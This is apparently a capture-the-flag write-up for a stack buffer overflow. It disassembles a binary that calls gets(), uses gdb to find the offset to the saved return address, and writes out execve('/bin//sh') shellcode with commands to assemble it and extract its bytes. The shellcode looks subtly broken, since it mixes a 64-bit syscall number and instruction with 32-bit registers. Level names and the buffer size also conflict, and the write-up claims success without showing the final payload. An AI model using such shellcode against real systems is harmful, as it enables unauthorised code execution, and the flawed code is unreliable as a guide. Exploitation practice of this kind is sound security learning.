# level01 - Buffer Overflow

On `level0`'s HOME, we find a binary named : `level0`

let's disassemble the `main` function of this binary:

```shell
Dump of assembler code for function main:
   0x08048480 <+0>:	push   ebp
   0x08048481 <+1>:	mov    ebp,esp
   0x08048483 <+3>:	and    esp,0xfffffff0
   0x08048486 <+6>:	sub    esp,0x50
   0x08048489 <+9>:	lea    eax,[esp+0x10]
   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
End of assembler dump.
```

As we see, a buffer of 40 is allocate on the stack of and passed as argument to `gets()`.
The function `gets()` read on stdin and don't check if the input buffer is big
enough to hold the string. So it's a simple BOF.
So let's exploit it !

<br>

We break on `gets()` call to find the right offset
```shell
(gdb) b *0x8048490
Breakpoint 1 at 0x8048490
(gdb) r <<< $(python -c "print 'A' * 100")
Starting program: /home/user/level1/level1 <<< $(python -c "print 'A' * 100")

Breakpoint 1, 0x08048490 in main ()
(gdb) x/x $esp+0x10
0xbffff6e0:	0x080484a0
(gdb) info frame
Stack level 0, frame at 0xbffff730:
 eip = 0x8048490 in main; saved eip 0xb7e454d3
 Arglist at 0xbffff728, args:
 Locals at 0xbffff728, Previous frame's sp is 0xbffff730
 Saved registers:
  ebp at 0xbffff728, eip at 0xbffff72c

```

So from value between the begin of buffer and `eip`, we compute an offset of 76
bytes. This knowing, we just have to rewrite `eip` to point to an emplacement on
the buffer where is our crafted shellcode.

<br>

This is our crafted shellcode (on our machine):
```shell
>$ cat /tmp/exploit1.s
_start:
    mov al, 59          ; execve syscall number
    xor edx, edx        ; set env to NULL
    push edx            ; push NULL string terminator
    mov edi, '//sh'     ; first arg to /bin/sh
    push edi            ; push to stack
    mov edi, '/bin'     ; first arg to /bin/sh
    push edi            ; push to stack
    mov edi, esp        ; move pointer to ['/bin//sh']
    push edx            ; push NULL string terminator
    push edi            ; push second arg to ['/bin//sh']
    mov esi, esp        ; pointer to args
    syscall
```

After compile it, let's extract the shellcode (on our machine):
```shell
(cd /tmp && nasm -f elf exploit1.s && ld -m elf_i386 -o exploit1 exploit1.o)
count=0; for i in $(objdump -d /tmp/exploit1 |grep "^ " |cut -f2); do echo -n $i; count=$((count + 1)); done; echo; echo "$count bytes"
```

Perfect, we got the `level1`'s password !
